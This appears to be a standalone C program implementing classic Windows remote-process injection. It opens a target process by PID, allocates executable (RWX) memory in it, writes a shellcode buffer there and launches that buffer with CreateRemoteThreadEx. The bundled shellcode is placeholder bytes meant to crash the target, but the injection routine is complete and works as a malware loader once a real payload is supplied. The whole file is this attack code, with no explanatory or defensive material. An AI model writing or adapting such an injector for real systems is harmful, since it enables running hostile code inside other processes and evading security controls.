#include <stdio.h>
#include <windows.h>

const char* k = "\033[0;32m[+]\033[m";
const char* i = "\033[0;34m[*]\033[m";
const char* e = "\033[0;31m[-]\033[m";

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer, pAddress = NULL;

/* Junk Shellcode that will crash the target program*/
unsigned char shellcode[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41";

int sysErrorHandler(int err) {
    switch(err) {
        case 5:
            printf("\t\033[0;31m-Access Denied\033[m\n");
            break;
        case 87:
            printf("\t\033[0;31m-Could not find process with that PID\033[m\n");
            break;
    };
    return 0;
}

int main(int argc, char* argv[]) {

    if (argc < 2){
        printf("%s Usage: program.exe <PID>\n", e);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("%s Trying to open a handle to process %ld\n",i, PID);
    
    hProcess = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION, TRUE, PID);
    if (hProcess != NULL)
        printf("%s got a handle to the process\n\\---0x%p\n", k, hProcess);

    if (hProcess == NULL) {
        int err = GetLastError();
        printf("%s Could not get a handle to the process (%ld), error: %ld\n", e, PID, err);
        sysErrorHandler(err);
        return EXIT_FAILURE;
    }
    
    pAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zu-bytes with RWX permissions\n", k, sizeof(shellcode));
    if (!pAddress) {
        int err = GetLastError();
        printf("%s Couldnt get memory address, error: %ld\n", e, err);
        CloseHandle(hProcess);
        sysErrorHandler(err);
        return EXIT_FAILURE;
    }
    WriteProcessMemory(hProcess, pAddress, shellcode, sizeof(shellcode), NULL);
    printf("%s Wrote %zu bytes to the process memory\n", k, sizeof(shellcode));

    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pAddress,
        NULL,
        0,
        0,
        &TID
    );

    if (hThread == NULL) {
        int err = GetLastError();
        printf("%s failed to get a handle into the thread, error: %ld\n", e, err);
        sysErrorHandler(err);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s Got a handle to the thread(%ld)\n", k, TID);

    printf("%s Cleaning up...", i);
    CloseHandle(hProcess);
    CloseHandle(hThread);
    return EXIT_SUCCESS;
}